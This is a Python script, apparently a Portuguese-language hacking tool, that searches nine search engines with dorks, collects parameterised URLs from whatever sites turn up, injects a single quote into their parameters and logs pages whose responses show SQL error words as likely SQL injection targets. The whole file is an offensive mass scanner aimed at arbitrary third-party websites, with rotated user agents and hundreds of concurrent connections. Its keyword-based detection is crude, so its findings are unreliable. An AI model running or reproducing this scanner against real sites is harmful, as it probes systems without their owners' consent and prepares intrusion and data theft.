import trio
import httpx
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin, quote
import random
import argparse
import json
import os
import datetime

os.system("clear")
print("""\033[1;33m
         _
 ___ ___| |___ ___ ___ ___ 
|_ -| . | |_ -|  _| .'|   |
|___|_  |_|___|___|__,|_|_|
      |_|\033[m instagram: \033[32m@nanoxsec\033[m
""")

dorks_path = "wordlist/dorks.txt"
output_path = "Resultado.json"

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
]

search_engines = [
    "https://www.google.com/search?q={}&start={}",
    "https://www.bing.com/search?q={}&first={}",
    "https://search.yahoo.com/search?p={}&b={}",
    "https://www.dogpile.com/serp?q={}&page={}",
    "https://www.mojeek.com/search?q={}&page={}",
    "https://www.qwant.com/?q={}&start={}",
    "https://www.startpage.com/do/search?q={}&page={}",
    "https://search.brave.com/search?q={}&offset={}",
    "https://yandex.com/search/?text={}&p={}"
]

suspected_urls = set()
confirmed_vulns = []

def clean_url(url):
    blacklist = ["bing.com", "duckduckgo.com", "go.microsoft.com", "yahoo.com", "mojeek.com", "dogpile.com", "google."]
    return not any(bad in url for bad in blacklist)

def extract_urls(html, base_url):
    soup = BeautifulSoup(html, "html.parser")
    urls = set()

    for a in soup.find_all("a", href=True):
        href = a["href"]

        # Padrão do Google
        if href.startswith("/url?q="):
            href = href.split("/url?q=")[1].split("&")[0]

        # Qwant, Brave, Yandex, etc – ignorar internos
        if any(domain in href for domain in [
            "qwant.com", "yandex.com", "startpage.com", "brave.com", "/settings", "/preferences", "javascript:void"]):
            continue

        # Remove lixo
        if href.startswith("/"):
            final_url = urljoin(base_url, href)
        else:
            final_url = href

        # Apenas URLs externas válidas e com http/https
        if final_url.startswith("http") and clean_url(final_url):
            urls.add(final_url)

    return urls
async def search_dork(dork, client):
    found_urls = set()
    for engine in search_engines:
        print("[{}] \033[36m[*]\033[m Buscando \033[31m{}\033[m em: {}".format(datetime.datetime.now().strftime("%H:%M:%S"),dork,engine.split("https://")[1].split("/")[0]))
        async with trio.open_nursery() as nursery:
            async def fetch_page(page):
                start = page * 20 if "google" in engine or "bing" in engine else page + 1
                url = engine.format(quote(dork), start)
                try:
                    response = await client.get(url, timeout=10)
                    if response.status_code == 200:
                        urls = extract_urls(response.text, url)
                        for u in urls:
                            if "?" in u:
                                found_urls.add(u)
                except Exception:
                    pass
            for p in range(20):
                nursery.start_soon(fetch_page, p)
    return found_urls

async def sql_injection_test(url, client):
    try:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        for param in qs:
            original = qs[param][0]
            payload = original + "'"
            qs[param][0] = payload
            new_query = urlencode(qs, doseq=True)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
            response = await client.get(test_url, timeout=6)
            if "?" in str(response.url) and clean_url(str(response.url)):
                suspected_urls.add(str(response.url))
            break
    except Exception:
        pass

async def confirm_vulnerability(url, client):
    try:
        response = await client.get(url, timeout=6)
        content = response.text.lower()
        if any(k in content for k in ["sql", "syntax", "mysql", "query", "warning", "error", "unterminated"]):
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)
            for param in qs:
                if "https://blog.inurl.com.br" in url or url.startswith("https://www.startpage.com"):
                    return
                print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] \033[36m[\033[mSQL\033[36m]\033[m \033[32m[+]\033[m {url} -> \033[1;32mPossível SQLi\033[m")
                confirmed_vulns.append({
                    "site": url,
                    "parametro": param,
                    "vulnerabilidade": "SQL Injection"
                })
                break
    except Exception:
        pass

async def save_results():
    if confirmed_vulns:
        with open(output_path, "w") as f:
            json.dump(confirmed_vulns, f, indent=2)
        print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] \033[32m[*] Resultados salvos em: {output_path}\033[m")
    else:
        print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] \033[32m[*] Nenhuma vulnerabilidade confirmada.\033[m")

async def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--alt", action="store_true", help="Usar wordlist de dorks em vez de digitar uma")
    args = parser.parse_args()

    dorks = []
    if args.alt:
        with open(dorks_path, "r") as f:
            dorks = [line.strip() for line in f if line.strip()]
    else:
        dork = input(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] \033[34m[*]\033[m Digite a dork: ").strip()
        dorks = [dork]

    print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] \033[36m[*]\033[m Scan iniciado...\033[m\n")
    all_urls = set()

    limits = httpx.Limits(max_connections=300, max_keepalive_connections=150)
    headers = {"User-Agent": random.choice(user_agents)}
    async with httpx.AsyncClient(headers=headers, timeout=10, limits=limits, follow_redirects=True) as client:
        async with trio.open_nursery() as nursery:
            async def run_search(dork):
                urls = await search_dork(dork, client)
                all_urls.update(urls)
            for d in dorks:
                nursery.start_soon(run_search, d)

    print(f"\n[{datetime.datetime.now().strftime('%H:%M:%S')}] \033[36m[*]\033[m Total de URLs encontradas: {len(all_urls)}")
    print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] \033[36m[*]\033[m Testando possíveis vulnerabilidades SQLi...\n")

    async with httpx.AsyncClient(headers=headers, timeout=10, limits=limits, follow_redirects=True) as client:
        async with trio.open_nursery() as nursery:
            for url in all_urls:
                nursery.start_soon(sql_injection_test, url, client)

    print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] \033[36m[*]\033[m Confirmando vulnerabilidades...\n")

    async with httpx.AsyncClient(headers=headers, timeout=10, limits=limits, follow_redirects=True) as client:
        async with trio.open_nursery() as nursery:
            for url in suspected_urls:
                nursery.start_soon(confirm_vulnerability, url, client)

    await save_results()

if __name__ == "__main__":
    trio.run(main)
